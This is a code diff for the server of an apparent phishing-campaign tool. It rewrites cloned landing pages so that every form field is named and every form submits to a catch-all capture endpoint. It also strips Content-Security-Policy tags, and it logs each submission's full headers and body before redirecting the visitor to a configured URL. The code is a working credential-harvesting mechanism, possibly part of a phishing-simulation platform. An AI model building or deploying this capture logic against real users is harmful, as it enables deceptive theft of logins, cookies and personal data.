@@ -66,11 +66,35 @@ const createLandingPageRouter = (landingPage, campaignId) => {
   });
 
   // Always handle form POSTs, store data, then refresh
-  router.post('*', (req, res) => {
+  router.post('*', express.urlencoded({ extended: true }), (req, res) => {
+    console.log('Form submission received:');
+    console.log('Headers:', req.headers);
+    console.log('Body:', req.body);
+    console.log('URL:', req.url);
+    console.log('Method:', req.method);
+    
     const formData = req.body;
-    console.log(`Captured form data for campaign ${campaignId}:`, formData);
-    storeFormSubmission(campaignId, landingPage.id, formData, req);
-    res.redirect(req.originalUrl);
+    
+    if (Object.keys(formData).length === 0) {
+      console.error('No form data received in request body');
+      return res.status(400).send('No form data received');
+    }
+
+    try {
+      console.log(`Processing form submission for campaign ${campaignId}`);
+      storeFormSubmission(campaignId, landingPage.id, formData, req);
+      
+      if (landingPage.capture_submitted_data && landingPage.redirect_url) {
+        console.log(`Redirecting to: ${landingPage.redirect_url}`);
+        return res.redirect(landingPage.redirect_url);
+      } else {
+        console.log('Redirecting back to original URL:', req.originalUrl);
+        return res.redirect(req.originalUrl);
+      }
+    } catch (error) {
+      console.error('Error processing form submission:', error);
+      return res.status(500).send('Error processing form submission');
+    }
   });
 
   return router;
@@ -538,13 +562,22 @@ const processLandingPageHtml = (html, campaignId, landingPageId) => {
     // Use VPS URL directly from config
     const baseUrl = config.trackingUrl;
 
+    // Fix Google Fonts preload
+    $('link[rel="preload"][href*="fonts.googleapis.com"]').each(function() {
+      $(this).attr('as', 'style');
+    });
+
+    // Remove CSP meta tags if they exist
+    $('meta[http-equiv="Content-Security-Policy"]').remove();
+
     // AUTO-INJECT NAME ATTRIBUTES so every field is submitted
     $('input, select, textarea').each((i, el) => {
       const $el = $(el);
-      if ($el.attr('name')) return;
-      const genName = $el.attr('id') || `autofield_${i}`;
-      if (!$el.attr('id')) $el.attr('id', genName);
-      $el.attr('name', genName);
+      if (!$el.attr('name')) {
+        const genName = $el.attr('id') || `autofield_${i}`;
+        if (!$el.attr('id')) $el.attr('id', genName);
+        $el.attr('name', genName);
+      }
     });
 
     // Enable all form elements - remove disabled attribute from all inputs and buttons
@@ -559,14 +592,20 @@ const processLandingPageHtml = (html, campaignId, landingPageId) => {
       }
     });
 
-    // Modify all forms to submit to our capture endpoint
+    // Modify all forms to submit to our endpoint
     $('form').each(function () {
       const originalAction = $(this).attr('action') || '';
       const method = $(this).attr('method') || 'post';
 
-      // Set our form action to the current path (will be handled by router.post('*'))
-      $(this).attr('action', '');
+      // Remove any existing form attributes that might conflict
+      $(this).removeAttr('action');
+      $(this).removeAttr('method');
+      $(this).removeAttr('target');
+      $(this).removeAttr('enctype');
+
+      // Set our form attributes
       $(this).attr('method', 'post');
+      $(this).attr('enctype', 'application/x-www-form-urlencoded');
 
       // Add hidden fields to track original form action and method
       $(this).append(`<input type="hidden" name="_originalAction" value="${originalAction}">`);
